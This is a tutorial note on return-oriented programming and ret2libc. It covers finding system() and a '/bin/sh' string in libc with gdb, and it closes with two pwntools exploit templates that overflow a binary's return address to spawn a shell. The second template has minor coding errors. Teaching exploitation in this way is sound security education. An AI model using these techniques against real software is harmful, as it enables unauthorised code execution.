# Return Oriented Programming (ROP)

Return Oriented programming or ROP is the binary exploiters ultimate example of living off the land. Compilers are *complex* and imperfect. When they take in source code and translate it into a complete machine readable package, a binary, they leave behind **extra** instructions along side those **needed** to carry out the programs operations. An attacker can harness these instructions or 'gadgets' placing them into a chain to complete near arbitrary goals. 



## Ret2libc

+ Ret2libc refers to the tactic of crafting a overflow exploit in the face of [mitigations](../Theory/MemoryProtections.md), namely NX, that prevent execution on the stack by 'living off the land'
+ In this case living off the land refers to utilizing strings and functions which exist within standard C libraries  
+ But wait, why do we have access to so much of the standard C libraries even though our program only uses a small subset of these ?

### Shared Libraries

+ A shared library is a library that is used by a program but is not statically bound to it at compellation time (that is a static library) 
+ This means that the library that the program wishes too use is loaded into its address space (virtual memory) at runtime (aka when it is selected by the scheduler)
+ This is done as an optimization to reduce memory usage and paging/swapping frequency 
+ You may [recall](https://devsheets.cybernetic.coffee/os/virtual-memory/) that in a virtual memory environment many programs can reference the same physical page where shared libraries are stored 

+ The addresses of shared libraries, including libc of course, can be obtained with `ldd`

`ldd <binary>`

+ So now we have the address where libc starts, but what can we actually do with this ?
+ First lets talk about where we will return


#### Useful Functions

+ libc contains a plethora of functions we could return to  
+ Normally a shell is the ultimate goal
+ At some point I will extend this list but for now I will just talk about **system**

**shell/process**

+ `system("/bin/sh")`

**Retrieving the functions address**

+ We can use gdb to print the address of our desired function in libc with

`pwndbg> p <function>`

+ If we simply overwrite the return pointer with this address however, nothing useful will happen
+ Why?

#### Imitating The Call Stack

+ The issue is that the operating system, or perhaps more accurately the CPU, expects the call stack to appear in a certain way and order
+ To understand this lets look at what the disassembly for a call to `system("/bin/bash")` looks like

**disassembly**

![Disassembly Call Stack System](https://user-images.githubusercontent.com/44337835/120813811-9a9f6800-c591-11eb-8af4-8944559ca2df.png)

+ We see that the compiled code moves the string "/bin/bash" stored at 0x2004 onto the stack just before calling system

![Pushing Bin Bash String to Stack](https://user-images.githubusercontent.com/44337835/120814468-3f21aa00-c592-11eb-91be-3d06e1407a46.png)

+ Without this the program would not be able to execute the system function call with the `"/bin/bash"` argument

**Debugging Trace**

![System Call Stack](https://user-images.githubusercontent.com/44337835/120811787-b4d84680-c58f-11eb-8856-98529e388b89.png)

+ Therefore to make our return to `system` work we must imitate this call stack
    + Note for a simple case like this were we wish to return a shell, essentially a function that should never return, we ignore imitating the moving of the functions (`system`) return address to the stack
+ We have control of the stack so it is possible for us to overwrite memory addresses on the stack with our own
+ But how can we make our `"/bin/sh"` string appear on the stack just before our call to `system`?

#### Finding a Useful Reference 

+ When talking about a reference we refer to a useful string that we may incorporate into our system call
+ Such strings are like
    + `"/bin/sh"`
    + `"/bin/bash"`
    + `"/bin/zsh"`
    + `"/bin/fish"`
+ There are a few ways to get such references
    + Environment variables
    + Existing Stack Address
    + libc
+ We hope to find a reference to such strings in libc as it is the most reliable of the methods
+ To do so we can use strings with a grep pipe

`strings strings -a -t x /lib/<path-to-libc> | grep "/bin/sh"`

+ This should return an address in hex which we can add to the start of libcs address range in its address space
+ The starting address of libc in the processes memory can be obtained with gdb as follows

`pwndbg> info proc map`

+ Taking the first address for libc to appear in the list as the address
+ Confirm that this reference does indeed lead to the reference with

`pwndbg> x/s <libc-hex-address> + <reference address>`

+ Now lets look at how we inject this payload into the running binary

##### Writing The Exploit With Pwntools

+ Implementing the above approaches we obtain an exploit script similar to the following
+ Note replace all `<...>` with appropriate values from above

```python

from pwn import *

## Assumes x86-32

proc_s = process('./<binary>')                                    # <-- Replace with your binary

padding = b'<padding/offset-bytes>'
system_address = p32(<0xsystem-address>)
eax_system = b'AAAA'                                              # <-- Dummy Function Return Pointer
bin_reference = p32(<0xlibc-offset-reference>)                    # <-- libc address of reference 

payload = padding + system_address + eax_system + bin_reference

# <-- Insert recvlines() as needed -->
proc_s.sendline(payload)
proc_s.interactive()

```

##### Automating The Process

+ In the above way we used a variety of tools and methods to determine locations of reference strings, function calls and offsets 
+ While this is useful because it helps us understand each step, pwntools can do **alot** of this for us
+ Note finding the address of libc on a remote system can be harder, here we assume remote is the same
as our local libc


```python
from pwn import *

proc_s = process('./<binary>')  

padding = b'<padding/offset-bytes>'                     # <-- overflow to just before return pointer

libc = ELF('libc-2.27.so')                              # <-- path to libc (remote (provided locally)/local)

p.recvlines(<lines>)                                    # <-- receive any banner messages

system_address = p32(<address-of-system>)               # <-- could be any address in libc, just need an offset
eax_system = b'AAAA'                                    # <-- Dummy Function Return Pointer

libc.address = system_address - libc.symbols['system']  # <-- Base of libc

bin_sh = p32(libc.search('/bin/sh').next())


payload = padding + system_address + eax_system + bin_sh

p.sendline(payload)
p.interactive()

```